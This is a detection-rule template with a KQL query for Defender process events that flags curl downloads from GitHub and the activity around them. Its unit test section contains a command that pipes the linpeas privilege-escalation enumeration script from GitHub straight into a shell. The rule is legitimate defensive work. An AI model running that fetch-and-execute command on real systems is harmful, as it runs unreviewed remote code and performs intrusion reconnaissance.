# Detection Rule Template

## Basic Information

- **Author:** y0uf0ol
- **Creation Date:** 02/23/2024
- **Maturity:** Testing
- **Reference:** /

## Naming

- **Name:** Data Transfer and Reconnaissance Activity via Network Utilities
- **Description:** Identifies suspicious inbound data transfers and network exploration using command-line network utilities. This could signal attack preparation, malware delivery, or attempts to profile your network.

## Technical Details

- **Tags:** T1595 T1560
- **Data Source:** Kusto: DeviceProcessEvents

## Rule Implementation

```yaml
let curl = (DeviceProcessEvents
| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "github" //these are examples
| project Timestamp);
DeviceProcessEvents
| where Timestamp between ((toscalar(curl) - 5min) .. (toscalar(curl) + 5min))
| project Timestamp, DeviceId, FileName, FolderPath, SHA1, ProcessCommandLine, InitiatingProcessCommandLine, ReportId
| sort by Timestamp desc 

```

- **Response:** Check for actions before and after the Alert
- **False Positive:** Legit usage of a downloaded tool
- **Severity:** low
- **Confidence:** low
 

 ## Unit Test

```yaml
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
